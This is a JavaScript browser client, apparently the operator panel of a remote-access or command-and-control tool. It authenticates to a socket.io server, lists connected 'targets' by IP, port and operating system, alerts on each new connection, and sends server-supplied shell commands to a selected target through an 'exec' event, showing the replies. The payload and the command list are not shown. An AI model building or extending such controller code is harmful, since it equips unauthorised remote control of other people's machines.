//variables

var socket; //store socket
var isConnected = false; //if connected to socket or not
var hashedPass = ''; //store hashed password
var selectedUser = ''; //store selected user
var selectedCommand=''; //store selected command
var userOS =''; //store selected user's os
var Allcommands = JSON.parse(localStorage.getItem('commands')); //get commands from browser localstorage (if any)
var outputContent = ""; //output content to load on text area

//elements

//connection side
const ip = document.getElementById('ip'); //ip (input)
const password = document.getElementById('password'); //password (input)
const connectionButton = document.getElementById('connectButton'); //connect to server (button)
const disconnectionButton =  document.getElementById('disconnectButton'); //disconnect server (button)
var connectionStatus = document.getElementById('connectionStatus'); //connection status (label)

//selection side
const targets = document.getElementById('targets'); //targets list selection (select)
const commands = document.getElementById('commands'); //command list selection (select) 
const sendButton =document.getElementById('send'); //send command to target (button)
var selelctUserLabel = document.getElementById('selectedUser'); //selected user display (label)

//output side
const textareaOutput = document.getElementById('output'); //output content display (texxtarea)
const notificationLabel = document.getElementById('notification'); //show notification (label)


//enable/ disable disconnection button (function)
function enable_disableDisconnectionButton(){
    if(isConnected == false)disconnectionButton.disabled = true; 
    else disconnectionButton.disabled = false;
};
enable_disableDisconnectionButton();//calling enable disable function

//hashing password user entering on password field (function)
function makeHash(value){
    return  CryptoJS.SHA256(value).toString(CryptoJS.enc.Hex); //returns hashed password
}

//load commands into commands (selection) element (function)
function loadCommands(Allcommands){
    commands.innerHTML = '<option value="none">None</option>';
    if(Allcommands){
        (Allcommands[userOS].command).forEach(element => {
            var cmd = document.createElement('option');
            cmd.value = element.code;
            cmd.textContent = `${element.name}`;
            commands.appendChild(cmd);
        });
    }else console.log("no commands are loaded") //log
}

//on target selection (event)
targets.addEventListener('change',()=>{
    indexNumber = targets.selectedIndex;
    selectedUser = targets.value;
    userOS = targets[indexNumber].getAttribute('os')
    selelctUserLabel.innerHTML = `Selected user : ${selectedUser}`
    console.log(`user index : ${indexNumber} , user : ${selectedUser} , os : ${userOS}`)
    console.log(`selected value : ${selectedUser}`)
    loadCommands(Allcommands);
});

//on command selection (event)
commands.addEventListener('change',()=>{
    indexNumber = commands.selectedIndex;
    selectedCommand = commands.value;
    console.log(`selected value : ${selectedCommand}`)

});

//oon connection button click (event)
connectionButton.onclick=()=>{
    //check if password and ip are not null
    if(password.value!="" && ip.value!=""){
        hashedPass = makeHash(password.value); //make password into hash
        socket = io(`http://${ip.value}`,{auth:{password:hashedPass},reconnection:false});  //connect to socketio server with auth
        
        //disconnect from server on button click (event)
        disconnectionButton.onclick=()=>{
            if(isConnected===true){
                socket.disconnect()
            }
        }

        //socket connection (event)
        socket.on('connect',()=>{
            isConnected = true;
            //set localstorage values
            localStorage.setItem('key',hashedPass);
            socket.emit('getTarget','')
            enable_disableDisconnectionButton();
           connectionStatus.innerHTML = "Connected"
           socket.emit('getCommand','')
           socket.emit('getTarget','')
        })

        //socket get target details on  socket.emit('getTarget','') request (event)
        socket.on('getTarget',(data)=>{
            targets.innerHTML = '<option value="none">None</option>';
            data.forEach(element => {
                var option = document.createElement('option');
                option.value = element.uniqueid;
                option.textContent = `${element.name} [${element.ip}:${element.port}]`;
                option.setAttribute('os',element.os)
                targets.appendChild(option);

            });
        });

        //get notifications (event) : on new connection
        socket.on('notification',(data)=>{
            outputContent+=`****NEW : ${data.ip}:${data.port} [${data.os}]**** | ${new Date().toLocaleTimeString()} \n`
                textareaOutput.textContent = outputContent;
                notificationLabel.textContent = `new connection ${data.ip}:${data.port} [${data.os}] `
                socket.emit('getTarget','')
                socket.emit('getCommand','')
            
        });

        //reply from target (event)
        socket.on('reply',(data)=>{
            outputContent+=`REPLY: ${data.from}:${data.result}| ${new Date().toLocaleTimeString()} \n`
            textareaOutput.textContent = outputContent;
           

        })

        //send button (event)
        sendButton.onclick=()=>{
            console.log(`selected user : ${selectedUser} \n selected command ${selectedCommand}`)
            if(selectedCommand!="" && selectedCommand!='none' && selectedUser !="" && selectedUser != ""){
                outputContent+=`[${selectedUser}] >> ${selectedCommand}\n`
                textareaOutput.textContent = outputContent;
                socket.emit('exec',{"cmd":selectedCommand,"target":selectedUser})
                
            }
        }

        //get available platform commands  on socket.emit('getCommand','')
        socket.on('getCommand',(data)=>{
            console.log("get command")
            console.log(data)
            localStorage.setItem('commands',JSON.stringify(data))
            Allcommands = data;
            
        })

        //on disconnect (event)
        socket.on('disconnect',()=>{
            isConnected = false;
            localStorage.removeItem('key');
            localStorage.removeItem('commands');
            enable_disableDisconnectionButton();
            connectionStatus.innerHTML = "Not Connected"
            selectedCommand='';
            commands.innerHTML = '<option value="none">None</option>';
            targets.innerHTML = '<option value="none">None</option>';
            selelctUserLabel.innerHTML = `Selected user : --`
        });
    }
}

